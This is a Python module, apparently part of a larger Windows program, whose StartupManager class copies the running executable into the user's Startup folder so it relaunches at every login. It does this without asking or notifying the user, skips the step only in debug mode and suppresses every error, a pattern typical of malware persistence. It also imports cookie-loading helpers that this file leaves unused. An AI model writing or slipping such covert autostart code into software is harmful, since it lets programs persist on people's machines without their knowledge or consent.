import os
import shutil
from pathlib import Path
from src.config import DEBUG_MODE
from src.utils.device import load_cookie, save_cookie


class StartupManager:
    _instance = None
    
    def __new__(cls):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
            cls._instance._initialized = False
        return cls._instance
    
    def __init__(self):
        if self._initialized:
            return
        self._initialized = True
    
    def get_startup_folder(self):
        appdata = Path(os.getenv('APPDATA'))
        startup_path = appdata / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'
        return startup_path
    
    def get_current_exe_path(self):
        if hasattr(os, '_base_executable'):
            return Path(os._base_executable)
        import sys
        return Path(sys.executable)
    
    def is_running_from_startup(self):
        current_exe = self.get_current_exe_path()
        startup_folder = self.get_startup_folder()
        
        try:
            current_exe_resolved = current_exe.resolve()
            if current_exe_resolved.parent == startup_folder.resolve():
                return True
        except Exception:
            pass
        
        return False
    
    def check_and_install(self):
        if DEBUG_MODE:
            return True
        
        if self.is_running_from_startup():
            return True
        
        try:
            current_exe = self.get_current_exe_path()
            startup_folder = self.get_startup_folder()
            
            if not current_exe.exists():
                return False
            
            startup_folder.mkdir(parents=True, exist_ok=True)
            
            exe_name = current_exe.name
            if not exe_name.endswith('.exe'):
                exe_name = exe_name.split('.')[0] + '.exe'
            
            startup_exe_path = startup_folder / exe_name
            
            if startup_exe_path.exists():
                return True
            
            shutil.copy2(current_exe, startup_exe_path)
            return True
        
        except Exception as e:
            return False
